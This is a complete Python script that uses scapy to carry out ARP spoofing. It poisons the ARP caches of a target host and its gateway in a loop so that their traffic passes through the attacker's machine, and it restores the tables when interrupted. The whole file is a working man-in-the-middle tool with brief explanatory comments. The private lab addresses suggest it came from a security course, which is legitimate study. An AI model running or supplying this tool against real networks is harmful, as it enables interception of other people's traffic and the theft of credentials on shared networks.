#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # an ARP request that asks for the ip and MAC address?
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # an Ethernet request sent to the broadcast MAC address
    arp_request_broadcast = broadcast/arp_request  # we combine both frames to get a request that asks the ip and MAC address of all hosts on the network range
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # scapy.srp(arp_request_broadcast) returns a list of two list, answered hosts and unanswered hosts, the answered list being on index 0

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)




target_ip = "10.0.2.10"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL C ...... Resetting ARP tables..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
